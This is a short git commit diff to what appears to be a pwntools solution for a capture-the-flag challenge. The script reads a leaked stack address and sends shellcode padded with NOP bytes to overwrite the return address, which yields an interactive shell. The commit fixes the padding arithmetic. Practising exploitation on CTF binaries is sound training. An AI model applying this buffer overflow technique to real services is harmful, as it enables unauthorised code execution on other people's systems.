85a223b6e1a2b9e794f959e302937bc8fc372021
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:34:01 -0400

    # Not finished

--- chall_03/03.py
+++ chall_03/03.py
@@ -5,7 +5,7 @@ p.recvuntil('Here\'s a leak :)')
 _ = p.recvline().strip()
 stack = int(_,16)
 payload = b'' + asm(shellcraft.sh())
-p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(payload) * b'\x90' + p64(stack)))
+p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(payload)) * b'\x90' + p64(stack))
 p.interactive()
 
 # Not finished
